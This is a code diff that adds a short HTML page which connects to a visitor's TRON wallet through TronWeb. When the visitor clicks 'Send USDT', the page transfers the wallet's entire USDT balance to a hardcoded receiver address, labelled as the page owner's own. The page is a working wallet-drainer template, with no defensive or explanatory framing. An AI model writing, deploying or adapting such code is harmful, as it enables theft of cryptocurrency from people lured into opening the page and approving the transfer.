@@ -1,1 +1,42 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Send All TRC20 USDT</title>
+  <script src="https://cdn.jsdelivr.net/npm/tronweb@4.4.0/dist/TronWeb.js"></script>
+</head>
+<body>
+  <h2>Send All USDT (TRC-20)</h2>
+  <button onclick="sendAllUSDT()">Send USDT</button>
+
+  <script>
+    const USDT_CONTRACT = "TXLAQ63Xg1NAzckPwKHvzw7CSEmLMEqcdj"; // TRC-20 USDT Contract
+    const RECEIVER_ADDRESS = "TGyoKBUG2VuTKpC6iSwcG1BHmyShCQtuvo"; // Your TRON address
+
+    async function sendAllUSDT() {
+      if (!window.tronWeb || !window.tronWeb.defaultAddress.base58) {
+        alert("Please open in Trust Wallet or TronLink DApp browser.");
+        return;
+      }
+
+      const tronWeb = window.tronWeb;
+      const usdtContract = await tronWeb.contract().at(USDT_CONTRACT);
+      const sender = tronWeb.defaultAddress.base58;
+      const balance = await usdtContract.balanceOf(sender).call();
+
+      if (balance.toString() === "0") {
+        alert("No USDT balance found.");
+        return;
+      }
+
+      try {
+        const tx = await usdtContract.transfer(RECEIVER_ADDRESS, balance).send();
+        alert("Transaction sent!\nTX: " + tx);
+      } catch (error) {
+        console.error(error);
+        alert("Transaction failed.");
+      }
+    }
+  </script>
+</body>
+</html>
 
